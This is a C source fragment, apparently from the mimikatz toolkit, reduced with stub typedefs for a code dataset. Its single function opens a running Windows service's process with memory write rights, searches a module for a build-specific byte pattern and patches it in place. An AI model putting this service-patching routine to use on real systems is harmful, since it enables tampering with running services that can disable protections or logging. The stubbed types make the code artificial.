
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_26__ TYPE_9__ ;
typedef struct TYPE_25__ TYPE_8__ ;
typedef struct TYPE_24__ TYPE_7__ ;
typedef struct TYPE_23__ TYPE_6__ ;
typedef struct TYPE_22__ TYPE_5__ ;
typedef struct TYPE_21__ TYPE_4__ ;
typedef struct TYPE_20__ TYPE_3__ ;
typedef struct TYPE_19__ TYPE_2__ ;
typedef struct TYPE_18__ TYPE_1__ ;


struct TYPE_26__ {int address; int * member_1; int * member_0; } ;
struct TYPE_18__ {int size; int kull_m_memoryAdress; } ;
struct TYPE_25__ {TYPE_1__ kull_m_memoryRange; } ;
struct TYPE_24__ {int SizeOfImage; int DllBase; } ;
struct TYPE_21__ {int off0; } ;
struct TYPE_20__ {int Length; int Pattern; } ;
struct TYPE_19__ {int Length; int Pattern; } ;
struct TYPE_23__ {TYPE_4__ Offsets; TYPE_3__ Patch; TYPE_2__ Search; } ;
struct TYPE_22__ {scalar_t__ dwCurrentState; int dwProcessId; } ;
typedef int SIZE_T ;
typedef TYPE_5__ SERVICE_STATUS_PROCESS ;
typedef TYPE_6__* PKULL_M_PATCH_GENERIC ;
typedef int PKULL_M_MEMORY_HANDLE ;
typedef int PCWSTR ;
typedef TYPE_7__ KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION ;
typedef TYPE_8__ KULL_M_MEMORY_SEARCH ;
typedef TYPE_9__ KULL_M_MEMORY_ADDRESS ;
typedef int HANDLE ;
typedef int BOOL ;


 int FALSE ;
 int KULL_M_MEMORY_GLOBAL_OWN_HANDLE ;
 int KULL_M_MEMORY_TYPE_PROCESS ;
 int MIMIKATZ_NT_BUILD_NUMBER ;
 int OpenProcess (int,int ,int ) ;
 int PRINT_ERROR (char*) ;
 int PRINT_ERROR_AUTO (char*) ;
 int PROCESS_QUERY_INFORMATION ;
 int PROCESS_VM_OPERATION ;
 int PROCESS_VM_READ ;
 int PROCESS_VM_WRITE ;
 scalar_t__ SERVICE_RUNNING ;
 int kprintf (char*,int ) ;
 int kull_m_memory_close (int ) ;
 scalar_t__ kull_m_memory_open (int ,int ,int *) ;
 int kull_m_patch (TYPE_8__*,TYPE_9__*,int ,TYPE_9__*,int ,int ,int *,int ,int *,int *) ;
 TYPE_6__* kull_m_patch_getGenericFromBuild (TYPE_6__*,int ,int ) ;
 scalar_t__ kull_m_process_getVeryBasicModuleInformationsForName (int ,int ,TYPE_7__*) ;
 scalar_t__ kull_m_service_getUniqueForName (int ,TYPE_5__*) ;

BOOL kull_m_patch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PCWSTR processOrService, PCWSTR moduleName, BOOL isService)
{
 BOOL result = FALSE;
 SERVICE_STATUS_PROCESS ServiceStatusProcess;
 PKULL_M_MEMORY_HANDLE hMemory;
 KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
 HANDLE hProcess;
 KULL_M_MEMORY_ADDRESS
  aPatternMemory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
  aPatchMemory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 KULL_M_MEMORY_SEARCH sMemory;

 PKULL_M_PATCH_GENERIC currenReferences;

 if(currenReferences = kull_m_patch_getGenericFromBuild(generics, cbGenerics, MIMIKATZ_NT_BUILD_NUMBER))
 {
  aPatternMemory.address = currenReferences->Search.Pattern;
  aPatchMemory.address = currenReferences->Patch.Pattern;
  if(kull_m_service_getUniqueForName(processOrService, &ServiceStatusProcess))
  {
   if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
   {
    if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
    {
     if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemory))
     {
      if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, moduleName, &iModule))
      {
       sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
       sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;

       if(result = kull_m_patch(&sMemory, &aPatternMemory, currenReferences->Search.Length, &aPatchMemory, currenReferences->Patch.Length, currenReferences->Offsets.off0, ((void*)0), 0, ((void*)0), ((void*)0)))
        kprintf(L"\"%s\" service patched\n", processOrService);
       else
        PRINT_ERROR_AUTO(L"kull_m_patch");
      } else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
      kull_m_memory_close(hMemory);
     }
    } else PRINT_ERROR_AUTO(L"OpenProcess");
   } else PRINT_ERROR(L"Service is not running\n");
  } else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
 } else PRINT_ERROR(L"Incorrect version in references\n");

 return result;
}
